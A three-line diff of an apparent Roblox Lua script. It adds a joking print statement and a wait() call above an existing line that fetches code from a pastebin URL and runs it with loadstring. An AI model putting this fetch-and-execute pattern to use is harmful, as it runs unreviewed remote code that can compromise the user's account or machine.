@@ -1,1 +1,3 @@
+print("im so hungry its 1:44 AM i hate scripting")
+wait()
 local loadedKey = loadstring(game:HttpGet("https://pastebin.com/raw/WNS5AQK3"))()
